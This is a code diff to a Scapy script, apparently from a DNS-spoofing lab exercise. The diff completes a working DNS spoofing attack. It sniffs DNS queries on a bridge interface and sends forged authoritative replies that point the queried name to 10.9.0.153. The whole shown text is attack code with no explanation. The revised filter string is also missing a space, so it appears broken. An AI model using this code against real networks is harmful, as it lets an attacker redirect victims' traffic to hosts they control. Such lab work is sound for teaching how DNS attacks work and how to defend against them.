@@ -11,9 +11,10 @@ def spoof_dns(pkt):
         print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
         ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Swap the source and destination IP addresses
         udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) # Swap the source and destination ports
-        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata=' ') # Create an answer record
+        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='10.9.0.153') # Create an answer record
         dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=Anssec) # Create a DNS packet
         spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
         send(spoofpkt)
-myFilter = "..." # Set the filter
-pkt = sniff(iface='br-43d947d991eb', filter=myFilter, prn=spoof_dns)
+
+myFilter = "udp port 53 and ip dst" + NS_NAME
+pkt = sniff(iface='br-c1e3c02a8177', filter=myFilter, prn=spoof_dns)
